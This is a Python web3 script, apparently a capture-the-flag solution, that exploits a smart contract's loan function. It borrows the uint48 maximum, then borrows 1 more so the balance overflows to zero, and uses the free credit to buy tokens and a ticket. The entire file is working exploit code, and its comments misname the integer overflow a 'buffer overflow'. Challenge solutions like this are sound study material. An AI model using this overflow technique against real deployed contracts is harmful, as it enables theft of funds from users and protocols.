from web3 import Web3
import requests

info_response = requests.get('http://RPC_URL/info')
info_data = info_response.json()

user_id = info_data['user_id']

contract_info_response = requests.get(f'http://RPC_URL/info/{user_id}')
contract_info_data = contract_info_response.json()

contract_add = contract_info_data['contractAddress']
private_key = contract_info_data['privateKey']
rpc_url = contract_info_data['rpcUrl']
account_address = contract_info_data['walletAddress']

print("Contract Address:", contract_add)
print("Private Key:", private_key)
print("RPC URL:", rpc_url)
print("Account Address:", account_address)


web3 = Web3(Web3.HTTPProvider(rpc_url))
print("Are we connected?", web3.is_connected())

contract_abi = '[{"inputs":[{"internalType":"address","name":"_wallet","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"buyTicket","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"buy_token","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"isChallSolved","outputs":[{"internalType":"bool","name":"solved","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint48","name":"amount","type":"uint48"}],"name":"loan","outputs":[],"stateMutability":"payable","type":"function"}]'

mirinaestation = web3.eth.contract(address=contract_add, abi=contract_abi)

gas_price = web3.to_wei('20', 'gwei')

transaction1 = mirinaestation.functions.loan(281474976710655).build_transaction({
    'from': account_address,
    'nonce': web3.eth.get_transaction_count(account_address),
    'chainId': web3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': gas_price
})
signed_txn = web3.eth.account.sign_transaction(transaction1, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print("Just took a loan of 281474976710655. Reached max limit.")

transaction2 = mirinaestation.functions.loan(1).build_transaction({
    'from': account_address,
    'nonce': web3.eth.get_transaction_count(account_address),
    'chainId': web3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': gas_price
})
signed_txn = web3.eth.account.sign_transaction(transaction2, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print("Just took a loan of 1. Buffer overflow should now make loan 0.")

transaction3 = mirinaestation.functions.buy_token(281474976710655).build_transaction({
    'from': account_address,
    'nonce': web3.eth.get_transaction_count(account_address),
    'chainId': web3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': gas_price
})
signed_txn = web3.eth.account.sign_transaction(transaction3, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print("Buy Token to buy ticket.")

transaction4 = mirinaestation.functions.buyTicket().build_transaction({
    'from': account_address,
    'nonce': web3.eth.get_transaction_count(account_address),
    'chainId': web3.eth.chain_id,
    'gas': 2000000,
    'gasPrice': gas_price
})
signed_txn = web3.eth.account.sign_transaction(transaction4, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)